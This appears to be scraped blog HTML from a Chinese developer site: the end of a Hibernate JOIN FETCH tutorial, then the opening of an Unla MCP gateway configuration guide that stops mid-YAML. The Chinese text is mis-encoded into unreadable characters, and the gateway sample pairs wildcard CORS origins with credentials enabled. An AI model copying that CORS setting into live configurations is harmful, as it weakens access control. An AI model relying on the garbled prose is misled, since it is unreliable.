        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Category"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">æ­¥éª¤ä¸‰ï¼šå®ç”¨ç±»HibernateUtil</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-7">æ­¥éª¤å››ï¼šä½¿ç”¨Fetch JoinæŸ¥è¯¢</h4>
<p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªæ–¹æ³•æ¥æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨<code>fetch join</code>æ¥æŸ¥è¯¢æ•°æ®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.query.Query;
<span class="hljs-keyword">import</span> com.example.domain.Category;
<span class="hljs-keyword">import</span> com.example.domain.Product;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateFetchJoinExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥ç¤ºä¾‹æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// ä½¿ç”¨Fetch JoinæŸ¥è¯¢æ•°æ®</span>
        fetchJoinExample(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Category</span>();
            category.setName(<span class="hljs-string">"Electronics"</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product1.setName(<span class="hljs-string">"Laptop"</span>);
            product1.setPrice(<span class="hljs-number">1000.0</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product2.setName(<span class="hljs-string">"Smartphone"</span>);
            product2.setPrice(<span class="hljs-number">500.0</span>);

            category.addProduct(product1);
            category.addProduct(product2);

            session.save(category);

            session.getTransaction().commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            session.getTransaction().rollback();
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fetchJoinExample</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT c FROM Category c JOIN FETCH c.products WHERE c.id = :categoryId"</span>;
            Query&lt;Category&gt; query = session.createQuery(hql);
            query.setParameter(<span class="hljs-string">"categoryId"</span>, <span class="hljs-number">1L</span>);

            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> query.uniqueResult();

            System.out.println(<span class="hljs-string">"Category: "</span> + category.getName());
            <span class="hljs-keyword">for</span> (Product product : category.getProducts()) {
                System.out.println(<span class="hljs-string">"Product: "</span> + product.getName() + <span class="hljs-string">" - $"</span> + product.getPrice());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">è¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>å®šä¹‰å®ä½“ç±»</strong>ï¼š</p>
<ul>
<li><code>Category</code>ç±»ä¸<code>Product</code>ç±»æ˜¯ä¸€å¯¹å¤šå…³ç³»ï¼Œ<code>Category</code>å¯ä»¥æœ‰å¤šä¸ª<code>Product</code>ã€‚</li>
<li>åœ¨<code>Category</code>ç±»ä¸­ï¼Œ<code>@OneToMany</code>æ³¨è§£ç”¨äºå®šä¹‰ä¸<code>Product</code>çš„å…³è”å…³ç³»ï¼Œå¹¶ä¸”é€šè¿‡<code>fetch = FetchType.LAZY</code>æŒ‡å®šå»¶è¿ŸåŠ è½½ã€‚</li>
</ul>
</li>
<li>
<p><strong>é…ç½®æ–‡ä»¶</strong>ï¼š</p>
<ul>
<li><code>hibernate.cfg.xml</code>é…ç½®æ–‡ä»¶ç”¨äºè®¾ç½®æ•°æ®åº“è¿æ¥ã€Hibernateå±æ€§å’Œæ˜ å°„ç±»ã€‚</li>
</ul>
</li>
<li>
<p><strong>å®ç”¨ç±»HibernateUtil</strong>ï¼š</p>
<ul>
<li><code>HibernateUtil</code>ç±»æä¾›äº†è·å–<code>SessionFactory</code>å®ä¾‹çš„æ–¹æ³•ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä½¿ç”¨Fetch JoinæŸ¥è¯¢</strong>ï¼š</p>
<ul>
<li>åœ¨<code>insertSampleData</code>æ–¹æ³•ä¸­ï¼Œåˆ›å»ºå¹¶ä¿å­˜ä¸€ä¸ª<code>Category</code>å’Œä¸¤ä¸ªå…³è”çš„<code>Product</code>ã€‚</li>
<li>åœ¨<code>fetchJoinExample</code>æ–¹æ³•ä¸­ï¼Œä½¿ç”¨HQLä¸­çš„<code>JOIN FETCH</code>å…³é”®å­—è¿›è¡ŒæŸ¥è¯¢ã€‚<code>JOIN FETCH</code>å¯ä»¥åŒæ—¶åŠ è½½<code>Category</code>åŠå…¶å…³è”çš„<code>Product</code>ï¼Œä»è€Œé¿å…äº†N+1æŸ¥è¯¢é—®é¢˜ã€‚</li>
<li><code>query.uniqueResult()</code>è¿”å›ä¸€ä¸ªå”¯ä¸€çš„<code>Category</code>ç»“æœï¼Œå¹¶ä¸”ç”±äºä½¿ç”¨äº†<code>fetch join</code>ï¼Œç›¸å…³è”çš„<code>Product</code>é›†åˆå·²ç»è¢«åˆå§‹åŒ–å’ŒåŠ è½½ã€‚</li>
</ul>
</li>
</ol>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥æœ‰æ•ˆåœ°åˆ©ç”¨<code>fetch join</code>æ¥ä¼˜åŒ–å…³è”å®ä½“çš„åŠ è½½è¿‡ç¨‹ï¼Œæé«˜æ•°æ®åº“è®¿é—®çš„æ€§èƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Unla MCP ç½‘å…³ä»£ç†é…ç½®æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7594919272686567450</link>    <guid>https://juejin.cn/post/7594919272686567450</guid>    <pubDate>2026-01-14T03:57:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594919272686567450" data-draft-id="7594854295746297892" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Unla MCP ç½‘å…³ä»£ç†é…ç½®æ•™ç¨‹"/> <meta itemprop="keywords" content="MCP"/> <meta itemprop="datePublished" content="2026-01-14T03:57:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ALLINAI"/> <meta itemprop="url" content="https://juejin.cn/user/4001878056639549"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Unla MCP ç½‘å…³ä»£ç†é…ç½®æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4001878056639549/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ALLINAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T03:57:40.000Z" title="Wed Jan 14 2026 03:57:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Unla</strong> æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ MCP ç½‘å…³æœåŠ¡ï¼Œå®ƒçš„æ ¸å¿ƒä¼˜åŠ¿åœ¨äºâ€œé›¶ä»£ç ä¾µå…¥â€ã€‚é€šè¿‡é…ç½®ï¼Œå¯ä»¥å°†ä¼ ç»Ÿçš„ HTTP API è½¬æ¢ä¸ºæ ‡å‡† MCP åè®®ï¼Œæˆ–å¯¹ç°æœ‰çš„ MCP Server è¿›è¡Œåå‘ä»£ç†ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.unla.amoylab.com%2Fcn%2Fconfiguration%2Fgateways" target="_blank" title="https://docs.unla.amoylab.com/cn/configuration/gateways" ref="nofollow noopener noreferrer">Unla MCP ç½‘å…³é…ç½®å®˜æ–¹æ–‡æ¡£</a></p>
<h4 data-id="heading-0">ä¸€ã€ å‡†å¤‡å·¥ä½œ</h4>
<ol>
<li><strong>éƒ¨ç½² Unla</strong>ï¼šé€šè¿‡ Docker æˆ–æºç å¯åŠ¨äº† Unlaã€‚</li>
<li><strong>ç®¡ç†åå°</strong>ï¼šè®¿é—® Unla çš„ Web UIï¼ˆé»˜è®¤åœ°å€é€šå¸¸ä¸º <code>http://localhost:5234</code>ï¼‰ã€‚</li>
</ol>
<h4 data-id="heading-1">äºŒã€ é…ç½®ç½‘å…³ä»£ç† (Gateways)</h4>
<p>åœ¨ Unla ä¸­ï¼Œç½‘å…³é…ç½®é€šå¸¸åˆ†ä¸ºä¸¤ç§åœºæ™¯ï¼š<strong>ä»£ç†ç°æœ‰ MCP Server</strong> å’Œ <strong>è½¬æ¢ HTTP API</strong>ã€‚</p>
<h5 data-id="heading-2">1. ä»£ç†ç°æœ‰çš„ MCP Server</h5>
<p>å¦‚æœä½ å·²ç»æœ‰ä¸€ä¸ªè¿è¡Œä¸­çš„ MCP Serverï¼ˆä¾‹å¦‚ Python/Node.js ç¼–å†™çš„ï¼‰ï¼Œå¯ä»¥é€šè¿‡ Unla è¿›è¡Œä¸­è½¬ã€‚</p>
<ul>
<li><strong>æ­¥éª¤</strong>ï¼š
<ol>
<li>ç™»å½• Web UIï¼Œç‚¹å‡» <strong>"ç½‘å…³é…ç½®"</strong> &gt; <strong>"åˆ›å»º"</strong> &gt; <strong>"MCPæœåŠ¡"</strong>ã€‚</li>
<li>é€‰æ‹© <strong>"YAMLæ¨¡å¼"</strong> æˆ–è€… <strong>"è¡¨å•æ¨¡å¼"</strong> å¡«å†™é…ç½®ä¿¡æ¯ã€‚</li>
<li>ç‚¹å‡» <strong>"åˆ›å»º"</strong> æŒ‰é’®ã€‚</li>
</ol>
</li>
</ul>
<h5 data-id="heading-3">2. å°† HTTP API è½¬æ¢ä¸º MCP å·¥å…·</h5>
<ul>
<li><strong>æ­¥éª¤</strong>ï¼š
<ol>
<li>ç™»å½• Web UIï¼Œç‚¹å‡» <strong>"ç½‘å…³é…ç½®"</strong> &gt; <strong>"åˆ›å»º"</strong> &gt; <strong>"HTTPæœåŠ¡"</strong>ã€‚</li>
<li>é€‰æ‹© <strong>"YAMLæ¨¡å¼"</strong> æˆ–è€… <strong>"è¡¨å•æ¨¡å¼"</strong> å¡«å†™é…ç½®ä¿¡æ¯ã€‚</li>
<li>ç‚¹å‡» <strong>"åˆ›å»º"</strong> æŒ‰é’®ã€‚</li>
</ol>
</li>
</ul>
<p>è¿™æ˜¯ Unla æœ€å¼ºå¤§çš„åŠŸèƒ½ï¼Œåªéœ€ç¼–å†™ YAML å³å¯å°†æ™®é€šçš„HTTPæ¥å£å˜æˆ AI ä»£ç†å·¥å…·ã€‚</p>
<ul>
<li><strong>YAMLé…ç½®ç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">"mock-server"</span>              <span class="hljs-comment"># ä»£ç†æœåŠ¡åç§°ï¼Œå…¨å±€å”¯ä¸€</span>
<span class="hljs-attr">tenant:</span> <span class="hljs-string">"default"</span>                <span class="hljs-comment"># ç§Ÿæˆ·æ ‡è¯†ï¼Œç”¨äºå¤šç§Ÿæˆ·åœºæ™¯</span>

<span class="hljs-comment"># è·¯ç”±é…ç½®</span>
<span class="hljs-attr">routers:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">server:</span> <span class="hljs-string">"mock-server"</span>       <span class="hljs-comment"># æœåŠ¡åç§°</span>
    <span class="hljs-attr">prefix:</span> <span class="hljs-string">"/gateway/user"</span>     <span class="hljs-comment"># è·¯ç”±å‰ç¼€ï¼Œå…¨å±€å”¯ä¸€ï¼Œä¸å¯é‡å¤ï¼ˆå¿…é¡»ä»¥ç§Ÿæˆ·IDå¼€å¤´ï¼‰</span>

    <span class="hljs-comment"># CORS é…ç½®</span>
    <span class="hljs-attr">cors:</span>
      <span class="hljs-attr">allowOrigins:</span>             <span class="hljs-comment"># å¼€å‘æµ‹è¯•ç¯å¢ƒå¯å…¨éƒ¨å¼€æ”¾ï¼Œçº¿ä¸Šæœ€å¥½æŒ‰éœ€å¼€æ”¾ã€‚ï¼ˆå¤§éƒ¨åˆ†MCP Clientæ˜¯ä¸éœ€è¦å¼€æ”¾è·¨åŸŸçš„ï¼‰</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"*"</span>
      <span class="hljs-attr">allowMethods:</span>             <span class="hljs-comment"># å…è®¸çš„è¯·æ±‚æ–¹æ³•ï¼ŒæŒ‰éœ€å¼€æ”¾ï¼Œå¯¹äºMCPï¼ˆSSEå’ŒStreamableï¼‰æ¥è¯´é€šå¸¸åªéœ€è¦è¿™3ä¸ªæ–¹æ³•å³å¯</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"GET"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"POST"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"PUT"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"OPTIONS"</span>
      <span class="hljs-attr">allowHeaders:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Content-Type"</span>        <span class="hljs-comment"># å¿…é¡»å…è®¸çš„</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Authorization"</span>       <span class="hljs-comment"># æœ‰é‰´æƒéœ€æ±‚çš„éœ€è¦æ”¯æŒè¯·æ±‚é‡Œæºå¸¦æ­¤Key</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Mcp-Session-Id"</span>      <span class="hljs-comment"># å¯¹äºMCPæ¥è¯´ï¼Œå¿…é¡»æ”¯æŒè¯·æ±‚é‡Œæºå¸¦è¿™ä¸ªKeyï¼Œå¦åˆ™Streamable HTTPæ— æ³•æ­£å¸¸ä½¿ç”¨</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"mcp-protocol-version"</span> <span class="hljs-comment"># MCPåè®®ç‰ˆæœ¬å¤´ï¼Œç”¨äºåè®®ç‰ˆæœ¬åå•†</span>
      <span class="hljs-attr">exposeHeaders:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Mcp-Session-Id"</span>      <span class="hljs-comment"># å¯¹äºMCPæ¥è¯´ï¼Œå¼€å¯è·¨åŸŸçš„æ—¶å€™å¿…é¡»è¦æš´éœ²è¿™ä¸ªKeyï¼Œå¦åˆ™Streamable HTTPæ— æ³•æ­£å¸¸ä½¿ç”¨</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"mcp-protocol-version"</span> <span class="hljs-comment"># MCPåè®®ç‰ˆæœ¬å¤´</span>
      <span class="hljs-attr">allowCredentials:</span> <span class="hljs-literal">true</span>    <span class="hljs-comment"># æ˜¯å¦å¢åŠ  Access-Control-Allow-Credentials: true è¿™ä¸ªHeader</span>

<span class="hljs-comment"># æœåŠ¡é…ç½®</span>
<span class="hljs-attr">servers:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"mock-server"</span>               <span class="hljs-comment"># æœåŠ¡åç§°ï¼Œéœ€è¦ä¸routersä¸­çš„serverä¿æŒä¸€è‡´</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Mock User Service"</span>  <span class="hljs-comment"># æœåŠ¡æè¿°</span>
    <span class="hljs-attr">allowedTools:</span>                     <span class="hljs-comment"># å…è®¸ä½¿ç”¨çš„å·¥å…·åˆ—è¡¨ï¼ˆä¸ºtoolsçš„å­é›†ï¼‰</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"register_user"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"get_user_by_email"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"update_user_preferences"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"update_user_avatar"</span>
    <span class="hljs-attr">config:</span>                                           <span class="hljs-comment"># æœåŠ¡çº§åˆ«çš„é…ç½®ï¼Œå¯ä»¥åœ¨toolsä¸­é€šè¿‡{{.Config}}å¼•ç”¨</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-number">123</span>                                     <span class="hljs-comment"># å†™æ­»çš„é…ç½®</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">'Bearer <span class="hljs-template-variable">{{ env "AUTH_TOKEN" }}</span>'</span>  <span class="hljs-comment"># ä»ç¯å¢ƒå˜é‡ä¸­è·å–çš„é…ç½®ï¼Œç”¨æ³•æ˜¯'{{ env "ENV_VAR_NAME" }}'</span>

<span class="hljs-comment"># å·¥å…·é…ç½®</span>
<span class="hljs-attr">tools:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"register_user"</span>                                   <span class="hljs-comment"># å·¥å…·åç§°</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Register a new user"</span>                      <span class="hljs-comment"># å·¥å…·æè¿°</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"POST"</span>                                          <span class="hljs-comment"># è¯·æ±‚ç›®æ ‡ï¼ˆä¸Šæ¸¸ã€åç«¯ï¼‰æœåŠ¡çš„HTTPæ–¹æ³•</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users"</span>                 <span class="hljs-comment"># ç›®æ ‡æœåŠ¡åœ°å€</span>
    <span class="hljs-attr">headers:</span>                                                <span class="hljs-comment"># è¯·æ±‚å¤´é…ç½®ï¼Œç”¨äºåœ¨è¯·æ±‚ç›®æ ‡æœåŠ¡æ—¶æºå¸¦çš„è¯·æ±‚å¤´</span>
      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">"application/json"</span>                      <span class="hljs-comment"># å†™æ­»çš„è¯·æ±‚å¤´</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Authorization}}</span>"</span>            <span class="hljs-comment"># ä½¿ç”¨æœåŠ¡é…ç½®ä¸­çš„å€¼</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>                          <span class="hljs-comment"># ä½¿ç”¨æœåŠ¡é…ç½®ä¸­çš„å€¼</span>
    <span class="hljs-attr">args:</span>                         <span class="hljs-comment"># å‚æ•°é…ç½®</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"username"</span>          <span class="hljs-comment"># å‚æ•°åç§°</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>          <span class="hljs-comment"># å‚æ•°ä½ç½®ï¼šheader, query, path, body, form-data</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>            <span class="hljs-comment"># å‚æ•°æ˜¯å¦å¿…å¡«</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>            <span class="hljs-comment"># å‚æ•°ç±»å‹</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Username"</span>   <span class="hljs-comment"># å‚æ•°æè¿°</span>
